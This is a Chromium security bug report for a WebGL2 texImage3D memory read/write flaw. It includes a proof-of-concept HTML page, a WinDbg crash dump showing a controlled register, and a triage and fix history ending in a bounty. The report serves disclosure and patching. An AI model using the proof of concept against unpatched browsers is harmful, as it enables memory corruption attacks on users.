# Security: WebGL - Arbitrary memory read/write in GLES2Implementation::TexImage3D

| Field | Value |
|-------|-------|
| **Issue ID** | [40086205](https://issues.chromium.org/issues/40086205) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>WebGL |
| **Reporter** | lo...@gmail.com |
| **Assignee** | zm...@chromium.org |
| **Created** | 2016-12-13 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

Steps to reproduce:

```
1. Open MemRW_TexImage3D_POC_esi_41414141.html in  Chrome browser.  
2. Chrome crashes at address 0x41414141 in gpu::gles2::GLES2Implementation::TexImage3D by read/write arbitrary memory address.  

	(920c.4fd8): Access violation - code c0000005 (!!! second chance !!!)  
	eax=4dc14141 ebx=0c800000 ecx=00012517 edx=0004945e esi=41414141 edi=0c800000  
	eip=5f954f60 esp=050fd0c0 ebp=050fd0e4 iopl=0         nv up ei pl nz na pe cy  
	cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207  
	chrome_child!memcpy+0x250:  
	5f954f60 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]  

```

**VERSION**

```
Chromium	57.0.2951.0 (Developer Build) (32-bit)  
( https://www.googleapis.com/download/storage/v1/b/chromium-browser-syzyasan/o/win32-release%2Fasan-win32-release-438191.zip?generation=1481661433272225&alt=media )  

Operating System: Windows 10   

```

**REPRODUCTION CASE** (A POC to illustrate the control of register esi is attached in MemRW\_TexImage3D\_POC\_esi\_41414141.html)

```
<html><body><canvas id="test"></canvas></body><script>  
var canvas0=document.getElementById("test");  
var gl = canvas0.getContext("webgl2");  
var texture1= gl.createTexture(); gl.bindTexture(gl.TEXTURE_3D, texture1);  
buffer0= gl.createBuffer();   
gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, buffer0);   
var observer1 =new MutationObserver(function (e) { gl.texImage3D(gl.TEXTURE_3D, 1, gl.R8,  225,664 , 143, 0, gl.LUMINANCE_ALPHA, gl.UNSIGNED_SHORT_4_4_4_4, 0x41414141);});   
observer1.observe(canvas0, { attributes: true});  
canvas0.width = 682;  
</script></html>  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

Type of crash: tab  

Crash State:

```
(920c.4fd8): Access violation - code c0000005 (!!! second chance !!!)  
eax=4dc14141 ebx=0c800000 ecx=00012517 edx=0004945e esi=41414141 edi=0c800000  
eip=5f954f60 esp=050fd0c0 ebp=050fd0e4 iopl=0         nv up ei pl nz na pe cy  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207  
chrome_child!memcpy+0x250:  
5f954f60 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]  
4:076> !analyze -v  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\*                                                                             \*  
\*                        Exception Analysis                                   \*  
\*                                                                             \*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

\*\*\* WARNING: Unable to verify checksum for E:\ChromeBuilds\syzyasan\asan-win32-release-438191\chrome.dll  

FAULTING_IP:   
chrome_child!memcpy+250 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 319]  
5f954f60 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]  

EXCEPTION_RECORD:  (.exr -1)  
ExceptionAddress: 5f954f60 (chrome_child!memcpy+0x00000250)  
   ExceptionCode: c0000005 (Access violation)  
  ExceptionFlags: 00000000  
NumberParameters: 2  
   Parameter[0]: 00000000  
   Parameter[1]: 41414141  
Attempt to read from address 41414141  

FAULTING_THREAD:  00004fd8  

PROCESS_NAME:  chrome.exe  

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_PARAMETER1:  00000000  

EXCEPTION_PARAMETER2:  41414141  

READ_ADDRESS:  41414141   

FOLLOWUP_IP:   
chrome_child!memcpy+250 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 319]  
5f954f60 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]  

NTGLOBALFLAG:  400  

APPLICATION_VERIFIER_FLAGS:  0  

APP:  chrome.exe  

ANALYSIS_VERSION: 10.0.10240.9 x86fre  

BUGCHECK_STR:  INVALID_POINTER_READ_FILL_PATTERN_41414141  

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141  

LAST_CONTROL_TRANSFER:  from 5ebe339a to 5f954f60  

STACK_TEXT:    
050fd0c4 5ebe339a 0c800000 41414141 0004945e chrome_child!memcpy+0x250  
050fd0e4 5ebeff43 41414141 00000298 000001c2 chrome_child!gpu::gles2::`anonymous namespace'::CopyRectToBuffer+0x4b  
050fd194 5f60df67 0000806f 00000001 00008229 chrome_child!gpu::gles2::GLES2Implementation::TexImage3D+0x37f  
050fd1d0 5f463ecf 0000806f 00000001 00008229 chrome_child!blink::WebGL2RenderingContextBase::texImage3D+0xd7  
050fd254 5f465341 00000000 00000000 058a4550 chrome_child!blink::WebGL2RenderingContextV8Internal::texImage3D1Method+0x252  
050fd290 5dfeecca 050fd2d4 058a4590 050fd408 chrome_child!blink::WebGL2RenderingContextV8Internal::texImage3DMethod+0x1cd  
050fd2e4 5e04d1ea 050fd350 5f465349 050fd408 chrome_child!v8::internal::FunctionCallbackArguments::Call+0xba  
050fd360 5e04d4c8 050fd3a0 058a4550 050fd3d8 chrome_child!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>+0x1ea  
050fd3a8 1370623e 0000000e 050fd408 058a4550 chrome_child!v8::internal::Builtin_Impl_HandleApiCall+0xc8  
WARNING: Frame IP not in any known module. Following frames may be wrong.  
050fd3cc 24c887b2 33e841a1 30cfe919 0000001c 0x1370623e  
050fd418 13707596 0c7f3fb9 0c7f3e35 00000004 0x24c887b2  
050fd434 1376fb9e 0c7f3e35 0c7f3fb9 0c7f3e35 0x13707596  
050fd454 1372a238 00000000 00000000 00000002 0x1376fb9e  
050fd480 5e260da5 33e841a1 0c7f3dfd 0c7f3e35 0x1372a238  
050fd4f8 5e2607ad 050fd5a4 058a4550 00000000 chrome_child!v8::internal::`anonymous namespace'::Invoke+0x1e5  
050fd528 5dff539f 050fd5a4 058a4550 058df0f0 chrome_child!v8::internal::Execution::Call+0x7d  
050fd5b0 5ef0e0f9 050fd6ac 058df100 058defd4 chrome_child!v8::Function::Call+0x13f  
050fd6b8 5fe3f8e9 050fd730 058df0f0 4b741a80 chrome_child!blink::V8ScriptRunner::callFunction+0x1ab  
050fd724 5f0cace5 050fd750 058defe8 3d921c7c chrome_child!blink::V8MutationCallback::call+0x10a  
050fd778 5f0cad7d 058defb8 058defbc 3d921c78 chrome_child!blink::MutationObserver::deliver+0x100  
050fd798 5ee4961b 0876cd98 00000000 050fd7b0 chrome_child!blink::MutationObserver::deliverMutations+0x78  
050fd7a8 5ef163a8 050fd828 5e316ab7 536089d0 chrome_child!WTF::Function<void __cdecl(void),1>::operator()+0x19  
050fd7b0 5e316ab7 536089d0 058a4550 058defac chrome_child!blink::microtaskFunctionCallback+0xb  
050fd828 5e31684f 5d9a21ac 058defac 058a4550 chrome_child!v8::internal::Isolate::RunMicrotasksInternal+0x227  
050fd83c 5ef0ef23 5b581988 058def78 00000000 chrome_child!v8::internal::Isolate::RunMicrotasks+0x1f  
050fd894 5ef1083b 050fd8ec 058a4550 058def78 chrome_child!blink::V8ScriptRunner::runCompiledScript+0x17b  
050fd8f4 5ef10643 050fd950 058def48 050fdbc4 chrome_child!blink::ScriptController::executeScriptAndReturnValue+0x185  
050fd93c 5ef10d17 050fd970 050fdbc4 00000001 chrome_child!blink::ScriptController::evaluateScriptInMainWorld+0x91  
050fd964 5fe9c3bf 050fdbc4 00000001 00000001 chrome_child!blink::ScriptController::executeScriptInMainWorld+0x29  
050fdb40 5fe9c4f4 050fdbc4 5d9a2130 21b2b9b0 chrome_child!blink::ScriptLoader::doExecuteScript+0x643  
050fdb5c 5fe9d3e3 050fdbc4 21b2afb8 5360d070 chrome_child!blink::ScriptLoader::executeScript+0x1f  
050fdc94 5f21a6e8 55454000 55410950 21b2afb8 chrome_child!blink::ScriptLoader::prepareScript+0x416  
050fddb4 5f21a624 21b2b9b0 050fddf8 4b7487e0 chrome_child!blink::HTMLParserScriptRunner::processScriptElementInternal+0x60  
050fdde8 5f206090 5d9a2b00 050fddf8 00000000 chrome_child!blink::HTMLParserScriptRunner::processScriptElement+0x8c  
050fde00 5f205a5e 4b7489e8 4b7487e0 00000000 chrome_child!blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder+0x34  
050fdfa8 5f205b90 00000000 050fe024 53608970 chrome_child!blink::HTMLDocumentParser::processTokenizedChunkFromBackgroundParser+0x217  
050fdfe0 5ee4961b 08753bc0 00000000 050fe000 chrome_child!blink::HTMLDocumentParser::pumpPendingSpeculations+0xb8  
050fdff0 5ee49966 08754650 00000000 050fe024 chrome_child!WTF::Function<void __cdecl(void),1>::operator()+0x19  
050fe000 5ee49498 08754650 00000000 05a1aef0 chrome_child!blink::TaskHandle::Runner::run+0x1f  
050fe024 5ee49650 08754640 08754654 08754650 chrome_child!base::internal::InvokeHelper<1,void>::MakeItSo<void (__thiscall blink::TaskHandle::Runner::\*const &)(blink::TaskHandle const &),base::WeakPtr<blink::TaskHandle::Runner> const &,blink::TaskHandle const &>+0x31  
050fe038 5e73b6b4 08754630 058807a8 00000000 chrome_child!base::internal::Invoker<base::internal::BindState<void (__thiscall blink::TaskHandle::Runner::\*)(blink::TaskHandle const &),base::WeakPtr<blink::TaskHandle::Runner>,blink::TaskHandle>,void __cdecl(void)>::Run+0x17  
050fe0f8 5ee967e3 60325f8c 050fe434 058807a8 chrome_child!base::debug::TaskAnnotator::RunTask+0x164  
050fe51c 5ee95c71 058a1b50 60325e00 050fe560 chrome_child!blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue+0x3ca  
050fe588 5facf2ce 00000000 050fe5ac 5facf2f2 chrome_child!blink::scheduler::TaskQueueManager::DoWork+0x121  
050fe594 5facf2f2 5ee95b50 00000000 05869074 chrome_child!base::internal::FunctorTraits<void (__thiscall gpu::GpuWatchdogThread::\*)(bool),void>::Invoke<base::WeakPtr<gpu::GpuWatchdogThread> const &,bool const &>+0x1a  
050fe5ac 5facfdc8 05869068 05869074 05869070 chrome_child!base::internal::InvokeHelper<1,void>::MakeItSo<void (__thiscall gpu::GpuWatchdogThread::\*const &)(bool),base::WeakPtr<gpu::GpuWatchdogThread> const &,bool const &>+0x22  
050fe5c0 5e73b6b4 05869058 00000000 00000000 chrome_child!base::internal::Invoker<base::internal::BindState<void (__thiscall gpu::GpuWatchdogThread::\*)(bool),base::WeakPtr<gpu::GpuWatchdogThread>,bool>,void __cdecl(void)>::Run+0x17  
050fe680 5e70b10d 6011f234 050ff35c 05875c38 chrome_child!base::debug::TaskAnnotator::RunTask+0x164  
050ff2e4 5e70a5b5 050ff35c 0586b388 05875c38 chrome_child!base::MessageLoop::RunTask+0x4cd  
050ff3a0 5e73cb44 00000000 05875c38 00000000 chrome_child!base::MessageLoop::DoWork+0x255  
050ff3b8 5e70ac2e 01875c38 050ff508 60039dc4 chrome_child!base::MessagePumpDefault::Run+0x74  
050ff480 5e71827f 60436898 00000000 0a657d8c chrome_child!base::MessageLoop::RunHandler+0x5e  
050ff4f4 5f697a98 05a11758 00000003 05a14920 chrome_child!base::RunLoop::Run+0x6f  
050ff5d0 5e6c69ff 050ff608 05869238 00000000 chrome_child!content::RendererMain+0x1e6  
050ff5e4 5e6c696d 050ff620 050ff608 050ff710 chrome_child!content::RunNamedProcessTypeMain+0x61  
050ff63c 5e6c601c 0550d0d0 69b025e0 050ff744 chrome_child!content::ContentMainRunnerImpl::Run+0x97  
050ff64c 5de4d557 050ff72c 5de4d4a0 0550d0d8 chrome_child!content::ContentMain+0x23  
050ff744 00c847cb 00c80000 050ff768 9c71710e chrome_child!ChromeMain+0xb7  
050ff7e4 00c82867 00c80000 9c71710e 00000028 chrome!MainDllLoader::Launch+0x1fc  
050ff904 00cc5d38 00c80000 00000000 05342a20 chrome!wWinMain+0x119  
050ff950 748938f4 04fe3000 748938d0 afc5a2b2 chrome!__scrt_common_main_seh+0xf6  
050ff964 77325de3 04fe3000 ac6a8664 00000000 KERNEL32!BaseThreadInitThunk+0x24  
050ff9ac 77325dae ffffffff 7734b7dc 00000000 ntdll!__RtlUserThreadStart+0x2f  
050ff9bc 00000000 00cc5db0 04fe3000 00000000 ntdll!_RtlUserThreadStart+0x1b  


FAULTING_SOURCE_LINE:  f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm  

FAULTING_SOURCE_FILE:  f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm  

FAULTING_SOURCE_LINE_NUMBER:  319  

FAULTING_SOURCE_CODE:    
No source found for 'f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm'  


SYMBOL_STACK_INDEX:  0  

SYMBOL_NAME:  chrome_child!memcpy+250  

FOLLOWUP_NAME:  MachineOwner  

MODULE_NAME: chrome_child  

IMAGE_NAME:  chrome_child.dll  

DEBUG_FLR_IMAGE_TIMESTAMP:  58505892  

STACK_COMMAND:  ~76s ; kb  

BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141_chrome_child!memcpy+250  

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ_FILL_PATTERN_41414141_chrome_child!memcpy+250  

FAILURE_PROBLEM_CLASS:  INVALID_POINTER_READ_FILL_PATTERN_41414141  

FAILURE_EXCEPTION_CODE:  c0000005  

FAILURE_IMAGE_NAME:  chrome_child.dll  

FAILURE_FUNCTION_NAME:  memcpy  

FAILURE_SYMBOL_NAME:  chrome_child.dll!memcpy  

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141_c0000005_chrome_child.dll!memcpy  

ANALYSIS_SOURCE:  UM  

FAILURE_ID_HASH_STRING:  um:invalid_pointer_read_fill_pattern_41414141_c0000005_chrome_child.dll!memcpy  

FAILURE_ID_HASH:  {316dbefe-3070-2317-51db-84cf6eb20a39}  

Followup:     MachineOwner  
---------  

```

## Attachments

- [MemRW_TexImage3D_POC_esi_41414141.html](attachments/MemRW_TexImage3D_POC_esi_41414141.html) (text/plain, 551 B)

## Timeline

### cl...@chromium.org (2016-12-15)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6637655220813824

### mb...@chromium.org (2016-12-19)

Thanks for the report! I'm able to reproduce this.

zmo: Would you mind taking a look?

[Monorail components: Blink>WebGL Internals>GPU>WebGL]

### sh...@chromium.org (2016-12-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-28)

zmo: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-01-11)

zmo: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### lo...@gmail.com (2017-01-18)

Anyone working on it?
If you need more info, please let me know.

### zm...@chromium.org (2017-01-23)

[Empty comment from Monorail migration]

### ba...@chromium.org (2017-01-23)

Was able to repro on Windows 10 with 58.0.2990.0 (Official Build) canary (64-bit). The attached page above sad-tabs when run.

Crash ID acd8d7c8-1321-4481-957b-6d4cd39a08ab (Server ID: 8328698880000000)

### ba...@chromium.org (2017-01-23)

Additional crash IDs:

fc893903-c6cf-490f-86fd-7e5196c8afec
2bc93aaf-0850-4280-8535-d88d64b68473

### zm...@chromium.org (2017-01-23)

Thanks Brandon.  I am looking into this now.

### zm...@chromium.org (2017-01-23)

The root cause of this is in WebGLRenderingContextBase::reshape(), where we reset PIXEL_UNPACK_BUFFER to null but never restore it.


### zm...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### zm...@chromium.org (2017-01-24)

A conformance test is added in https://github.com/KhronosGroup/WebGL/pull/2271
Chrome side fix is uploaded for review: https://codereview.chromium.org/2652653003/

### bu...@chromium.org (2017-01-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6932383d121be06d4c40094b7f44b99026d2c396

commit 6932383d121be06d4c40094b7f44b99026d2c396
Author: zmo <zmo@chromium.org>
Date: Tue Jan 24 04:22:22 2017

Fix a bug where PIXEL_UNPACK_BUFFER is cleared but never restored.

BUG=673929
TEST=test case from the bug
R=kbr@chromium.org,kainino@chromium.org
CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel

Review-Url: https://codereview.chromium.org/2652653003
Cr-Commit-Position: refs/heads/master@{#445640}

[modify] https://crrev.com/6932383d121be06d4c40094b7f44b99026d2c396/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp


### zm...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-01-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/079ae727092a8011d34ddc6cb3feeb7422bc4a6a

commit 079ae727092a8011d34ddc6cb3feeb7422bc4a6a
Author: qiankun.miao <qiankun.miao@intel.com>
Date: Tue Jan 24 18:05:53 2017

Roll WebGL 9b0c9de..3c655cc

https://chromium.googlesource.com/external/khronosgroup/webgl.git/+log/9b0c9de..3c655cc

BUG=603906, 666384, 678382, 673929, 682190, 684399

TEST=bots

CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.win:win_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.android:android_optional_gpu_tests_rel

Review-Url: https://codereview.chromium.org/2649343002
Cr-Commit-Position: refs/heads/master@{#445758}

[modify] https://crrev.com/079ae727092a8011d34ddc6cb3feeb7422bc4a6a/DEPS
[modify] https://crrev.com/079ae727092a8011d34ddc6cb3feeb7422bc4a6a/content/test/gpu/gpu_tests/webgl2_conformance_expectations.py
[modify] https://crrev.com/079ae727092a8011d34ddc6cb3feeb7422bc4a6a/content/test/gpu/gpu_tests/webgl_conformance_expectations.py


### zm...@chromium.org (2017-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-25)

This bug requires manual review: DEPS changes referenced in bugdroid comments.
Please contact the milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), ketakid@(cros), govind@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2017-01-26)

+ awhalley@ for merge review.

### zm...@chromium.org (2017-01-26)

Only the CL in https://crbug.com/chromium/673929#c13 is needed to merge, not the CL in https://crbug.com/chromium/673929#c17.

### aw...@chromium.org (2017-01-30)

Good for 57 merge.

### go...@chromium.org (2017-01-30)

Approving merge to M57 branch 2987 based on https://crbug.com/chromium/673929#c22. Please merge ASAP. If merge happens today before 5:00 PM PT, then we can it for tomorrow's last M57 Dev release. Thank you.

### ka...@chromium.org (2017-01-30)

zmo is OOO today so I'll do the merge.

### go...@chromium.org (2017-01-30)

Please merge  your change to M57 branch 2987 ASAP.If merge happens today before 5:00 PM PT, then we can take it for tomorrow's last M57 Dev release. Thank you.

### bu...@chromium.org (2017-01-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e6ff7696c74146965b4f7e083bf3d29e02f104c7

commit e6ff7696c74146965b4f7e083bf3d29e02f104c7
Author: Kai Ninomiya <kainino@chromium.org>
Date: Mon Jan 30 22:04:04 2017

Fix a bug where PIXEL_UNPACK_BUFFER is cleared but never restored.

BUG=673929
TEST=test case from the bug
R=kbr@chromium.org,kainino@chromium.org
CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel

Review-Url: https://codereview.chromium.org/2652653003
Cr-Commit-Position: refs/heads/master@{#445640}
(cherry picked from commit 6932383d121be06d4c40094b7f44b99026d2c396)

Review-Url: https://codereview.chromium.org/2662003002 .
Cr-Commit-Position: refs/branch-heads/2987@{#194}
Cr-Branched-From: ad51088c0e8776e8dcd963dbe752c4035ba6dab6-refs/heads/master@{#444943}

[modify] https://crrev.com/e6ff7696c74146965b4f7e083bf3d29e02f104c7/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp


### zm...@chromium.org (2017-02-03)

Thanks Kai.

### aw...@chromium.org (2017-02-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-02-06)

Nice one! The panel decided to award $2000 for this report!

### aw...@chromium.org (2017-02-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-05-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### la...@chromium.org (2017-06-20)

[Empty comment from Monorail migration]

[Monorail components: -Internals>GPU>WebGL]

### is...@google.com (2017-06-20)

This issue was migrated from crbug.com/chromium/673929?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086205)*
